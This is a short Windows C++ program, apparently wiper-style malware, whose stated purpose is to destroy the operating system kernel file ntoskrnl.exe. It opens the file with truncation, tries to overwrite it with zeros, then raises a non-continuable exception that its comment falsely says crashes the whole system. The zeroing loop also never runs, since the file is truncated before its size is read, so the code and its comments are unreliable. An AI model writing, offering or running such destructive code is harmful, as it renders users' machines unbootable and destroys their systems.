#include <iostream>
#include <windows.h>

int main() {
    // Get the system directory
    char systemPath[MAX_PATH];
    if (!GetSystemDirectoryA(systemPath, MAX_PATH)) {
        std::cerr << "Failed to get system directory." << std::endl;
        return 1;
    }

    // Construct the path to the kernel file
    char kernelPath[MAX_PATH];
    snprintf(kernelPath, MAX_PATH, "%s\\ntoskrnl.exe", systemPath);

    // Overwrite the kernel file with zeros
    HANDLE hFile = CreateFileA(kernelPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open kernel file for writing." << std::endl;
        return 1;
    }

    DWORD bytesWritten;
    BYTE zeroBuffer[4096] = {0}; // 4KB buffer of zeros
    DWORD fileSize = GetFileSize(hFile, nullptr);
    
    for (DWORD i = 0; i < fileSize; i += sizeof(zeroBuffer)) {
        if (!WriteFile(hFile, zeroBuffer, sizeof(zeroBuffer), &bytesWritten, nullptr)) {
            std::cerr << "Failed to write to kernel file." << std::endl;
            CloseHandle(hFile);
            return 1;
        }
    }

    CloseHandle(hFile);

    // Crash the system to ensure the changes take effect immediately
    // This simulates a critical system error
    RaiseException(STATUS_ASSERTION_FAILURE, EXCEPTION_NONCONTINUABLE, 0, nullptr);

    return 0;
}